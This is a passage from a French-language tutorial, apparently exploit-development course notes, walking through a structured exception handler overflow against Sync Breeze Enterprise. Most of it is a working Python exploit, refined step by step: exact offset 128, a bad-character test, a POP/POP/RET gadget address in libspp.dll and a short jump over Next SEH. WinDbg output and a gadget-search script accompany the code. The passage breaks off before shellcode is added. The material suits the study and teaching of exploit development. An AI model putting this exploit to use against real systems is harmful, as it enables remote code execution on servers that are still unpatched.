:</p> <ul> <li><code>POP R32</code> : Retrouve la derni\u00e8re valeur d\u00e9pos\u00e9e dans la pile et la stock dans le registre en param\u00e8tre<ul> <li>Ici l'adresse de retour de <code>ExecuteHandler2</code></li> </ul> </li> <li><code>POP R32</code> : Retrouve la derni\u00e8re valeur d\u00e9pos\u00e9e dans la pile et la stock dans le registre en param\u00e8tre<ul> <li>Ici le param\u00e8tre <code>ExceptionRecord</code></li> </ul> </li> <li><code>RET</code> : Transfert le contr\u00f4le \u00e0 l'adresse stock\u00e9e sur la pile</li> </ul> <p>Cependant, avant de chercher pour la s\u00e9quence d'instruction <code>POP</code>, <code>POP</code>, <code>RET</code> (P/P/R) on doit d\u00e9terminer l'offset exact pour r\u00e9\u00e9crire l'exception handler sur la pile.</p>"},{"location":"binary-exploitation/2-seh-overflow/#determiner-loffset-exact","title":"D\u00e9terminer l'offset exact","text":"<p>On doit d\u00e9terminer la taille exact n\u00e9cessaire pour \u00e9craser pr\u00e9cis\u00e9ment le gestionnaire d'exception. Pour cela on va envoyer une chaine de caract\u00e8re non r\u00e9p\u00e9titive qui permet d'identifier instantan\u00e9ment la position des 4 bytes. On utilise l'outil <code>msf-pattern_create</code> :</p> <pre><code>$ msf-pattern_create -l 1000\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B\n</code></pre> <p>On modifie la preuve de concept en rempla\u00e7ant les <code>A</code> par la chaine g\u00e9n\u00e9r\u00e9e :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  inputBuffer = b\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B\"\n\n  header =  b\"\\x75\\x19\\xba\\xab\"\n  header += b\"\\x03\\x00\\x00\\x00\"\n  header += b\"\\x00\\x40\\x00\\x00\"\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', inputBuffer[-1])\n\n  buf = header + inputBuffer\n  [...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>(910.18c8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=33654132 edx=77853b20 esi=00000000 edi=00000000\neip=33654132 esp=01dff438 ebp=01dff458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n33654132 ??              ???\n#\n0:011&gt; !exchain\n01dff44c: ntdll!ExecuteHandler2+44 (77853b20)\n01dffe1c: libpal!md5_starts+149fb (0090df5b)\n01dfff54: 33654132\nInvalid exception stack at 65413165\n</code></pre> <p>L'exception handler a \u00e9t\u00e9 correctement r\u00e9\u00e9crit par notre motif unique.</p> <p>Pour identifier l'offset exacte, on peut r\u00e9utiliser le m\u00eame outil :</p> <pre><code>$ msf-pattern_offset -l 1000 -q 33654132\n[*] Exact match at offset 128\n</code></pre> <p>On modifie la preuve de concept en adaptant le nombre de <code>A</code> et en r\u00e9\u00e9crivant <code>EIP</code> sp\u00e9cifiquement avec des <code>B</code> :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  inputBuffer = b\"\\x41\" * 128\n  inputBuffer += b\"\\x42\\x42\\x42\\x42\"\n  inputBuffer += b\"\\x43\" * (size - len(inputBuffer))\n\n  header =  b\"\\x75\\x19\\xba\\xab\"\n  header += b\"\\x03\\x00\\x00\\x00\"\n  header += b\"\\x00\\x40\\x00\\x00\"\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', inputBuffer[-1])\n\n  buf = header + inputBuffer\n  [...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>(1810.34c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=42424242 edx=77853b20 esi=00000000 edi=00000000\neip=42424242 esp=01a0f438 ebp=01a0f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n42424242 ??              ???\n#\n0:009&gt; !exchain\n01a0f44c: ntdll!ExecuteHandler2+44 (77853b20)\n01a0fe1c: libpal!md5_starts+149fb (008ddf5b)\n01a0ff54: 42424242\nInvalid exception stack at 41414141\n</code></pre> <p>L'exception handler a \u00e9t\u00e9 correctement r\u00e9\u00e9crit par les <code>B</code>.</p>"},{"location":"binary-exploitation/2-seh-overflow/#identifier-les-mauvais-caracteres","title":"Identifier les mauvais caract\u00e8res","text":"<p>En fonction de l'application, du type de vuln\u00e9rabilit\u00e9 ou du protocole utilise certains caract\u00e8res sont consid\u00e9r\u00e9 comme bad. Les bad char ne doivent pas \u00eatre utilis\u00e9s dans le buffer, l'adresse de retour ou le shellcode.</p> <p>Un caract\u00e8re est consid\u00e9r\u00e9 comme bad s'il entraine un changement dans la nature du crash ou une d\u00e9formation en m\u00e9moire tel que <code>0x00</code> qui est le null byte.</p> <p>Le caract\u00e8re  <code>0x00</code> doit \u00eatre syst\u00e9matiquement \u00e9vit\u00e9.</p> <p>Il faut tester et identifier l'ensemble des <code>bad</code> caract\u00e8res a chaque d\u00e9veloppement d'exploit en envoyant l'ensemble des caract\u00e8res possible entre <code>0x00</code> et <code>0xFF</code> au sein du buffer pour observer la r\u00e9action de l'application.</p> <p>On modifie la preuve de concept afin d'inclure l'ensemble des caract\u00e8res possible sauf <code>0x00</code> :</p> <pre><code>#!/usr/bin/python                                                                                                           \nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  badchars = (\n  b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\"\n  b\"\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\"\n  b\"\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\"\n  b\"\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\"\n  b\"\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\"\n  b\"\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\"\n  b\"\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\"\n  b\"\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\"\n  b\"\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\"\n  b\"\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\"\n  b\"\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\"\n  b\"\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\"\n  b\"\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\"\n  b\"\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\"\n  b\"\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\"\n  b\"\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n  b\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\"\n  b\"\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\"\n  b\"\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\"\n  b\"\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")\n\n  inputBuffer = b\"\\x41\" * 128\n  inputBuffer += b\"\\x42\\x42\\x42\\x42\"\n  inputBuffer += badchars\n  inputBuffer += b\"\\x43\" * (size - len(inputBuffer))\n\n  header =  b\"\\x75\\x19\\xba\\xab\"\n  header += b\"\\x03\\x00\\x00\\x00\"\n  header += b\"\\x00\\x40\\x00\\x00\"\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', inputBuffer[-1])\n\n  buf = header + inputBuffer\n  [...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>0:011&gt; g\n(b40.17d4): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=42424242 edx=77853b20 esi=00000000 edi=00000000\neip=42424242 esp=021af438 ebp=021af458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n42424242 ??              ???\n</code></pre> <p><code>EIP</code> est toujours sous notre contr\u00f4le et contient bien les <code>0x42</code>. On affiche maintenant les octets point\u00e9s par le deuxi\u00e8me param\u00e8tre (<code>EstablisherFrame</code>) pass\u00e9 \u00e0 la fonction <code>_except_handler</code> \u00e0 partir du registre de pile (<code>ESP</code>) :</p> <p>Note : Comme vu pr\u00e9c\u00e9demment, c'est le param\u00e8tre <code>EstablisherFrame</code> qui contient notre payload et donc les caract\u00e8res de <code>0x01</code> a <code>0xFF</code>.</p> <pre><code>#\n0:011&gt; dds esp L5\n021af438  77853b02 ntdll!ExecuteHandler2+0x26\n021af43c  021af540\n021af440  021aff54\n021af444  021af55c\n021af448  021af4cc\n#\n0:011&gt; db 021aff54\n021aff54  41 41 41 41 42 42 42 42-01 03 04 05 06 07 08 09  AAAABBBB........\n021aff64  00 3e 8d 00 38 6b d8 00-72 40 8d 00 40 6f d8 00  .&gt;..8k..r@..@o..\n</code></pre> <p>On identifie que <code>0x02</code> n'est pas pr\u00e9sent, indiquant que c'est un mauvais caract\u00e8re.</p> <p>On continue la proc\u00e9dure jusqu'\u00e0 identifier tous les mauvais caract\u00e8res.</p> <p>Note : Il est possible qu'il n'y ait pas assez de place pour stocker tous les caract\u00e8res jusqu'\u00e0 <code>0xFF</code>. Dans ce cas, il est n\u00e9cessaire de supprimer une premi\u00e8re partie ayant d\u00e9j\u00e0 \u00e9t\u00e9 valid\u00e9e pour v\u00e9rifier les caract\u00e8res suivants.</p>"},{"location":"binary-exploitation/2-seh-overflow/#trouver-une-sequence-ppr","title":"Trouver une s\u00e9quence P/P/R","text":"<p>Pour rediriger le flot d'ex\u00e9cution, il faut donc trouver une s\u00e9quence d'instruction P/P/R tout en prenant en compte les protections m\u00e9moire.</p> <p>On utilise les modules pr\u00e9sents nativement dans WinDBG :</p> <pre><code>0:009&gt; .load narly\n#\n# List tous les modules charg\u00e9s et leurs protections m\u00e9moire\n0:009&gt; !nmod\n00400000 00463000 syncbrs              /SafeSEH OFF                C:\\Program Files\\Sync Breeze Enterprise\\bin\\syncbrs.exe\n00540000 00614000 libpal               /SafeSEH OFF                C:\\Program Files\\Sync Breeze Enterprise\\bin\\libpal.dll\n00920000 009d5000 libsync              /SafeSEH OFF                C:\\Program Files\\Sync Breeze Enterprise\\bin\\libsync.dll\n10000000 10226000 libspp               /SafeSEH OFF                C:\\Program Files\\Sync Breeze Enterprise\\bin\\libspp.dll\n53ea0000 53eb6000 pnrpnsp              /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\system32\\pnrpnsp.dll\n549a0000 549b1000 napinsp              /SafeSEH ON  /GS *ASLR *DEP \n[...]\n75e70000 75e92000 GDI32                NO_SEH       /GS *ASLR *DEP C:\\Windows\\System32\\GDI32.dll\n77710000 777a5000 KERNEL32             /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\KERNEL32.DLL\n777b0000 77940000 ntdll                /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SYSTEM32\\ntdll.dll\n</code></pre> <ul> <li>L'indication <code>/SafeSEH OFF</code> indique que <code>syncbrs.exe</code> et les modules <code>libpal.dll</code> - <code>libsync.dll</code> et <code>libspp.dll</code> sont compil\u00e9s sans <code>SafeSEH</code></li> <li>Les protections <code>DEP</code> et <code>ASLR</code> ne sont pas actives non plus</li> </ul> <p>Pour que l'exploit soit le plus stable possible on va chercher la s\u00e9quence P/P/R dans un module qui fait partie de l'application, ainsi <code>libspp.dll</code> est un bon candidat.</p> <p>On va \u00e9crire un petit script pour chercher les instructions P/P/R car contrairement \u00e0 l'instruction <code>JMP ESP</code> qu'on cherchait via la commande <code>s</code> de WinDBG, ici les instructions <code>POP</code> peuvent s'appliquer \u00e0 un grand nombre de registres.</p> <p>Le script aura besoin des \u00e9l\u00e9ments suivants pour fonctionner :</p> <ul> <li>L'adresse de d\u00e9but de la plage m\u00e9moire</li> <li>L'adresse de fin de la plage m\u00e9moire</li> </ul> <pre><code>0:009&gt; lm m libspp\nBrowse full module list\nstart    end        module name\n10000000 10226000   libspp     (deferred) \n</code></pre> <ul> <li>Les opcodes des instructions \u00e0 chercher</li> <li>On g\u00e9n\u00e8re les opcodes des instructions <code>POP</code> pour tous les registres x86 sauf <code>ESP</code></li> </ul> <pre><code>$ msf-nasm_shell \nnasm &gt; pop eax\n00000000  58                pop eax\n#\nnasm &gt; pop ebx\n00000000  5B                pop ebx\n#\nnasm &gt; pop ecx\n00000000  59                pop ecx\n#\nnasm &gt; pop edx\n00000000  5A                pop edx\n#\nnasm &gt; pop esi\n00000000  5E                pop esi\n#\nnasm &gt; pop edi\n00000000  5F                pop edi\n#\nnasm &gt; pop ebp\n00000000  5D                pop ebp\n#\nnasm &gt; ret\n00000000  C3                ret\n</code></pre> <p>On voit que les opcodes se suivent pour les instructions <code>POP R32</code> : <code>58 59 5a 5b [5c] 5d 5e 5f</code>.</p> <p>Script final pour identifier la s\u00e9quence en m\u00e9moire :</p> <ul> <li><code>.block</code> : D\u00e9finis un bloc de code \u00e0 ex\u00e9cuter</li> <li><code>.for (r $t0 = 0x58; $t0 &lt; 0x5F; r $t0 = $t0 + 0x01)</code> : Boucle en utilisant le pseudo-registre <code>t0</code> en commen\u00e7ant \u00e0 <code>0x58</code> pour finir avant <code>0x5F</code>. Cette premi\u00e8re boucle vise \u00e0 identifier la premi\u00e8re instruction <code>POP R32</code>.</li> <li><code>.for (r $t1 = 0x58; $t1 &lt; 0x5F; r $t1 = $t1 + 0x01)</code> : Deuxi\u00e8me boucle qui vise \u00e0 identifier la deuxi\u00e8me instruction <code>POP R32</code>.</li> <li><code>s-[1]b 10000000 10226000 $t0 $t1 c3</code> : Commande de recherche des instructions P/P/R.</li> <li>Le flag <code>1</code> indique qu'on veut afficher l'adresse ou les opcodes sont trouv\u00e9s</li> <li>Adresses de d\u00e9but et de fin du module cible</li> <li>Les deux pseudo-regitres <code>t0</code> et <code>t1</code></li> <li>Opcode de l'instruction <code>ret</code></li> </ul> <pre><code>.block\n{\n .for (r $t0 = 0x58; $t0 &lt; 0x5F; r $t0 = $t0 + 0x01)\n {\n  .for (r $t1 = 0x58; $t1 &lt; 0x5F; r $t1 = $t1 + 0x01)\n  {\n   s-[1]b 10000000 10226000 $t0 $t1 c3\n  }\n }\n}\n</code></pre> <p>Le script peut \u00eatre enregistr\u00e9 sur le disque pour \u00eatre ensuite ex\u00e9cut\u00e9 via WinDBG :</p> <pre><code>0:009&gt; $&gt;&lt;C:\\Users\\Offsec\\Downloads\\script.wds\n0x1015a2f0\n0x100087dd\n0x10008808\n[...]\n0x100491e4\n</code></pre> <p>On d\u00e9sassemble la premi\u00e8re adresse indiqu\u00e9e par le script. Le flot P/P/R s'y trouve bien :</p> <pre><code>libspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n1015a2f1 5b              pop     ebx\n1015a2f2 c3              ret\n</code></pre> <p>On modifie la preuve de concept :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  inputBuffer = b\"\\x41\" * 128                           # Offset exact\n  inputBuffer += pack(\"&lt;L\", (0x1015a2f0))               # P/P/R (EIP)\n  inputBuffer += b\"\\x43\" * (size - len(inputBuffer))    # Payload\n\n  header =  b\"\\x75\\x19\\xba\\xab\"\n  header += b\"\\x03\\x00\\x00\\x00\"\n  header += b\"\\x00\\x40\\x00\\x00\"\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', inputBuffer[-1])\n\n  buf = header + inputBuffer\n  [...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>#\n0:010&gt; g\n(418.e08): Invalid lock sequence - code c000001e (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=77853b02 ebx=01aaf540 ecx=1015a2f4 edx=77853b20 esi=00000000 edi=00000000\neip=01aaff58 esp=01aaf444 ebp=01aaf458 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\n01aaff58 f0a215104343    lock mov byte ptr ds:[43431015h],al ds:0023:43431015=??\n#\n0:010&gt; !exchain\n01aaf44c: ntdll!ExecuteHandler2+44 (77853b20)\n01aafe1c: libpal!md5_starts+149fb (009edf5b)\n01aaff54: *** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libspp.dll\nlibspp!pcre_exec+16460 (1015a2f0)\nInvalid exception stack at 41414141\n#\n0:010&gt; u 1015a2f0 L3\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n1015a2f1 5b              pop     ebx\n1015a2f2 c3              ret\n</code></pre> <p>On retrouve bien l'adresse des instructions P/P/R via la commande <code>!exchain</code> : <code>libspp!pcre_exec+16460 (1015a2f0)</code>. En d\u00e9sassemblant le contenu de l'adresse <code>1015a2f0</code> on retrouve bien les instructions P/P/R.</p> <p>On positionne un point d'arr\u00eat sur l'adresse de la s\u00e9quence P/P/R puis on relance l'ex\u00e9cution :</p> <pre><code>#\n0:009&gt; bp 0x1015a2f0\n</code></pre> <p>Point d'arr\u00eat atteint, <code>EIP</code> contient bien l'adresse pointant vers la s\u00e9quence P/P/R :</p> <pre><code>#\n0:009&gt; g\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f0 esp=01a4ef00 ebp=01a4ef20 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n</code></pre> <p>On d\u00e9roule \u00e9tape par \u00e9tape :</p> <pre><code>#\n0:009&gt; r\neax=00000000 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f0 esp=01a4ef00 ebp=01a4ef20 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n#\n0:009&gt; t\neax=77853b02 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f1 esp=01a4ef04 ebp=01a4ef20 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16461:\n1015a2f1 5b              pop     ebx\n#\n0:009&gt; t\neax=77853b02 ebx=01a4f008 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f2 esp=01a4ef08 ebp=01a4ef20 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16462:\n1015a2f2 c3              ret\n</code></pre> <p>On a bien \u00e9t\u00e9 capable de rediriger le flot. Le flot suit l'adresse indiqu\u00e9e via <code>exchain</code> qui est l'adresse ou commence notre s\u00e9quence P/P/R.</p> <p>On d\u00e9r\u00e9f\u00e9rence le registre de pile (<code>ESP</code>) :</p> <pre><code>0:008&gt; dd poi(esp) L8\n018fff54  41414141 1015a2f0 43434343 43434343\n018fff64  43434343 43434343 43434343 43434343\n\n0:008&gt; t\neax=77383b02 ebx=018ff540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000\neip=018fff54 esp=018ff444 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n018fff54 41              inc     ecx\n</code></pre> <p>Apr\u00e8s l'ex\u00e9cution de <code>RET</code> on retourne sur la pile au sein de notre payload juste avant l'adresse de notre _except_handler (<code>exchain</code>).</p> <p>Ceci est d\u00fb au fait que le param\u00e8tre <code>EstablisherFrame</code> pointe sur le d\u00e9but de la structure <code>_EXCEPTION_REGISTRATION_RECORD</code> qui a pour premier \u00e9l\u00e9ment le membre <code>Next</code> suivi par <code>_except_handler</code>.</p>"},{"location":"binary-exploitation/2-seh-overflow/#island-hopping","title":"Island-Hopping","text":"<p>Comme indiqu\u00e9 pr\u00e9c\u00e9demment, la structure <code>EXCEPTION_REGISTRATION_RECORD</code> commence avec le membre <code>Next</code>. Une fois que l'ex\u00e9cution est redirig\u00e9e vers ce membre sur la pile via la s\u00e9quence P/P/R le CPU va ex\u00e9cuter les instructions assembleur g\u00e9n\u00e9r\u00e9es via la opcodes de l'adresse m\u00e9moire contenant la s\u00e9quence P/P/R.</p> <p>Les octets qui composent l'adresse des instructions P/P/R sont traduits en une instruction <code>lock mov byte ptr ds:[43431015h],al</code> :</p> <pre><code>0:011&gt; u eip L8\n01f2ff54 41              inc     ecx\n01f2ff55 41              inc     ecx\n01f2ff56 41              inc     ecx\n01f2ff57 41              inc     ecx\n01f2ff58 f0a215104343    lock mov byte ptr ds:[43431015h],al  #\n01f2ff5e 43              inc     ebx\n01f2ff5f 43              inc     ebx\n01f2ff60 43              inc     ebx\n#\n0:011&gt; dd 0x43431015 L4                       # Adresse pas mapp\u00e9e\n43431015  ???????? ???????? ???????? ????????\n</code></pre> <p>Cette instruction va \u00e9crire le registre <code>al</code> dans <code>0x43431015</code>. Ce n'est pas une adresse mapp\u00e9e donc il va y avoir un access violation.</p> <p>On peut contourner \u00e7a en utilisant les 4er bytes de la structure <code>Next</code> SEH pour cr\u00e9er une instruction qui va sauter (jump) par-dessus et rediriger vers un shellcode apr\u00e8s l'adresse P/P/R.</p> <p>En assembleur, les short jump sont aussi appel\u00e9s relative jump. Le premier opcode d'un short jump est toujours <code>0XEB</code> et le second opcode est l'offset relatif en avant ou en arri\u00e8re.</p> <p>Le jump relatif est de <code>06</code> bytes plut\u00f4t que 4, qui est la taille de l'adresse P/P/R, car l'offset est calcul\u00e9 \u00e0 partir de l'adresse suivant le jump.</p> <p>On modifie la preuve de concept en ajoutant <code>06eb</code> correspondant au short jump suivis de deux instructions <code>NOP</code> repr\u00e9sent\u00e9es par les opcode <code>9090</code> :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  inputBuffer = b\"\\x41\" * 124                        # On baisse de 4 la taille (de 128 a 124)\n  inputBuffer += pack(\"&lt;L\",(0x06eb9090))             # Next Structure Exception Handler\n  inputBuffer += pack(\"&lt;L\", (0x1015a2f0))            # P/P/R (EIP)\n  inputBuffer += b\"\\x43\" * (size - len(inputBuffer)) # Payload\n\n  header =  b\"\\x75\\x19\\xba\\xab\"\n  header += b\"\\x03\\x00\\x00\\x00\"\n  header += b\"\\x00\\x40\\x00\\x00\"\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', inputBuffer[-1])\n\n  buf = header + inputBuffer\n  [...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>(cd4.1814): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libpal.dll\neax=41414141 ebx=019efa1c ecx=019eff18 edx=019ef9d4 esi=019eff18 